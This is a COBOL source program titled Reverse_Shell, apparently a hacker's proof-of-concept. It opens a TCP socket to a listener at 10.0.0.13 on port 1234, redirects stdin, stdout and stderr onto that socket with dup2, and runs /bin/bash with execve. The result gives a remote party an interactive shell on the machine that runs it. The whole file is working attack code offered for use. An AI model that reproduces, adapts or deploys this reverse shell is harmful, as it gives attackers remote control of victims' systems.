       IDENTIFICATION DIVISION.

       Program-ID.     Reverse_Shell.
       Author.         @HackVlix.
       Date-Written.   April 2023.
      *************** 
       DATA DIVISION.
        
       WORKING-STORAGE SECTION.

      * Arguments for the socket call.
       01 AF_INET PIC 9(8) Binary Value 2.                            
       01 SOCK_STREAM PIC 9(8) Binary Value 1.
       01 int0 PIC 9(8) Binary Value 0.
       01 socket-descriptor PIC 9(8) Binary.

      * Arguments for the connect call.
      * Note that port and ip address must be supplied in Big Endian.     
      * We have arguments
      *    sin_len = 0x00, sin_family = 0x02
      *        (combined because IBM COBOL does not allow single bytes)                                   
      *    IP = 10.0.0.13 (hex 0x0A00000D, decimal 167772173)
      *    port = 1234 (hex 0x04D2).
      * Normally, we would have to convert these numbers to Big Endian,
      * but IBM COBOL already stores these values as Big Endian,
      * so we do not need to do this manually.
       01 listener-address.
           02 sin_len_sin_family PIC 9(1) Binary Value 2.
           02 sin_port PIC 9(4) Binary Value 1234.
           02 sin_addr PIC 9(8) Binary Value 167772173.
           02 sin_zero PIC X(8) Value Low-Values.
       01 int16 PIC 9(8) Binary Value 16.

      * Standard file descriptors on *NIX systems.                                      
       01 STDIN PIC 9(9) Binary Value 0.
       01 STDOUT PIC 9(9) Binary Value 1.
       01 STDERR PIC 9(9) Binary Value 2.
       01 file-descriptor PIC 9(9) Binary.

      * Argument for execve as a C-string (null-terminated).
       01 path-string.
           02 path PIC X(9) Value "/bin/bash".
           02 end-C-string PIC X(1) Value Low-Values.                                

      ********************
       PROCEDURE DIVISION.

      * Display "[+] Creating socket: ".
      * Display "   domain   = " AF_INET.
      * Display "   type     = " SOCK_STREAM.
      * Display "   protocol = " int0.
       Call "socket" Using
           By Value AF_INET
           By Value SOCK_STREAM                                       
           By Value int0
           Returning socket-descriptor
       End-Call.
      * Display "[DEBUG] Socket descriptor = " socket-descriptor.

       Display "[+] Connecting: ".
       Display "   family  = " sin_len_sin_family In listener-address.
       Display "   port    = " sin_port In listener-address.
       Display "   address = " sin_addr In listener-address.
       Call "connect" Using
           By Value socket-descriptor
           By Reference listener-address
           By Value int16
           Returning return-code
       End-Call.
      * Display "[DEBUG] connection status = " return-code.                      

       Call "dup2" Using
           By Value socket-descriptor
           By Value STDIN
           Returning file-descriptor
       End-Call.
       Call "dup2" Using
           By Value socket-descriptor
           By Value STDOUT
           Returning file-descriptor
       End-Call.
       Call "dup2" Using
           By Value socket-descriptor
           By Value STDERR
           Returning file-descriptor
       End-Call.

       Display "[+] Running shell on target: " path In path-string.
       Call "execve" Using
           By Reference path-string
           By Value int0
           By Value int0
           Returning return-code
       End-Call.

       Stop Run.
